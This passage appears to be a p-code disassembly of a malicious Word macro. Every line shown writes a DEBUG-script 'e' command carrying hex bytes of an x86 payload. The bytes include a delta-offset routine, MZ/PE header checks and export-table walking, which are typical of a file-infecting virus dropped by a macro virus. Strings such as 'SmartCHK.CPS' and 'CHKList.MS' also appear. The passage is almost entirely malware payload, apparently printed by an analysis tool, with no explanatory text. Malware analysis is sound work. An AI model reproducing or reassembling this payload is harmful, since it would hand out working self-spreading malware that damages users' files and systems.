' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ee0 4c 69 73 74 2e 4d 53 00 43 48 4b 4c 69 73 74 2e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #229:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ef0 43 50 53 00 53 6d 61 72 74 43 48 4b 2e 4d 53 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #230:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f00 53 6d 61 72 74 43 48 4b 2e 43 50 53 00 ff c0 17 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #231:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f10 40 00 c8 17 40 00 d0 17 40 00 dd 17 40 00 e8 17 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #232:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f20 40 00 f4 17 40 00 00 18 40 00 0d 18 40 00 9c 60 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #233:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f30 e8 00 00 00 00 5d 81 ed 35 18 40 00 89 ad d6 19 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #234:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f40 40 00 e8 50 0c 00 00 8d 85 c6 19 40 00 50 64 67 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #235:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f50 ff 36 00 00 64 67 89 26 00 00 8b 44 24 2c 39 80 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #236:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f60 b4 00 00 00 74 1b 48 3d 00 00 00 40 76 02 eb ee "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #237:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f70 b8 00 00 f7 bf 66 81 38 4d 5a 74 05 b8 00 00 ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #238:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f80 7f 89 85 8e 13 40 00 8b f8 66 81 3f 4d 5a 0f 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #239:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0f90 30 01 00 00 8b 7f 3c 03 bd 8e 13 40 00 66 81 3f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #240:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fa0 50 45 0f 85 1c 01 00 00 60 8b 77 78 03 b5 8e 13 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #241:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fb0 40 00 89 b5 a8 13 40 00 83 c6 10 ad 89 85 ac 13 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #242:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fc0 40 00 ad ad 89 85 b0 13 40 00 03 85 8e 13 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #243:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fd0 ad 03 85 8e 13 40 00 89 85 b4 13 40 00 ad 03 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #244:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0fe0 8e 13 40 00 89 85 b8 13 40 00 ad 03 85 8e 13 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #245:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ff0 00 89 85 bc 13 40 00 8b b5 b4 13 40 00 ad 03 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #246:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1000 8e 13 40 00 8b b5 b8 13 40 00 89 b5 c0 13 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #247:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1010 8b 3e 03 bd 8e 13 40 00 b9 00 00 00 00 bb 0b 10 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #248:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1020 40 00 03 dd 8b f3 a6 75 07 80 3f 00 74 28 eb f6 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #249:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1030 66 41 66 3b 8d b0 13 40 00 0f 8d 85 00 00 00 83 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #250:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1040 85 c0 13 40 00 04 8b b5 c0 13 40 00 8b 3e 03 bd "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #251:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1050 8e 13 40 00 eb ce 8b de 43 d1 e1 8b b5 bc 13 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #252:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1060 00 03 f1 33 c0 66 8b 06 c1 e0 02 8b b5 b4 13 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #253:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1070 00 03 f0 8b 3e 03 bd 8e 13 40 00 89 bd 95 11 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #254:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1080 00 61 be 1a 10 40 00 bf 99 11 40 00 03 f5 03 fd "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #255:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1090 56 8b 85 8e 13 40 00 50 ff 95 95 11 40 00 83 f8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #256:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10a0 00 74 21 ab 46 80 3e 00 75 fa 46 80 3e ff 75 e0 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #257:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10b0 83 fd 00 74 05 e8 c0 05 00 00 e8 53 00 00 00 e8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #258:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10c0 6c 00 00 00 eb 04 8b 64 24 08 64 67 8f 06 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #259:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10d0 83 c4 04 61 57 bf 00 00 00 00 83 ff 00 74 28 8b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #260:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10e0 87 c4 13 40 00 03 87 a0 13 40 00 50 53 8d 9f 03 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #261:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 10f0 1a 40 00 2b c3 83 e8 04 89 87 03 1a 40 00 5b 58 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #262:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1100 5f 9d e9 00 00 00 00 83 c4 04 6a 00 ff 97 99 11 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #263:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1110 40 00 6a 00 ff 95 bd 11 40 00 83 f8 03 75 09 c6 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #264:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1120 85 44 17 40 00 01 eb 07 c6 85 44 17 40 00 00 c3 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #265:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1130 68 80 00 00 00 8d 85 f0 14 40 00 50 ff 95 e5 11 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #266:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1140 40 00 68 80 00 00 00 8d 85 18 16 40 00 50 ff 95 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #267:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1150 e9 11 40 00 8d 85 c8 13 40 00 50 68 80 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #268:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1160 ff 95 a5 11 40 00 80 bd 44 17 40 00 00 74 0f c7 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #269:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1170 85 40 17 40 00 03 00 00 00 e8 4b 00 00 00 83 fd "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #270:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1180 00 74 38 8d 85 f0 14 40 00 50 ff 95 ed 11 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #271:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1190 c7 85 40 17 40 00 03 00 00 00 e8 2a 00 00 00 8d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #272:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11a0 85 18 16 40 00 50 ff 95 ed 11 40 00 c7 85 40 17 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #273:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11b0 40 00 03 00 00 00 e8 0e 00 00 00 8d 85 c8 13 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #274:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11c0 00 50 ff 95 ed 11 40 00 c3 8d bd 3d 12 40 00 8b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #275:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11d0 c7 50 8d 85 05 10 40 00 50 ff 95 9d 11 40 00 83 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #276:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11e0 f8 ff 74 50 50 8d 77 2c 8b 4f 20 e8 4a 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #277:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11f0 72 10 ff 8d 40 17 40 00 66 83 bd 40 17 40 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #278:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1200 74 2a 58 50 57 50 ff 95 a1 11 40 00 85 c0 74 1c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #279:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1210 8d 77 2c 8b 4f 20 e8 1f 00 00 00 72 06 ff 8d 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #280:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1220 17 40 00 83 bd 40 17 40 00 00 75 d6 58 50 ff 95 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #281:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1230 c5 11 40 00 e8 e4 08 00 00 c3 60 89 8d 71 17 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
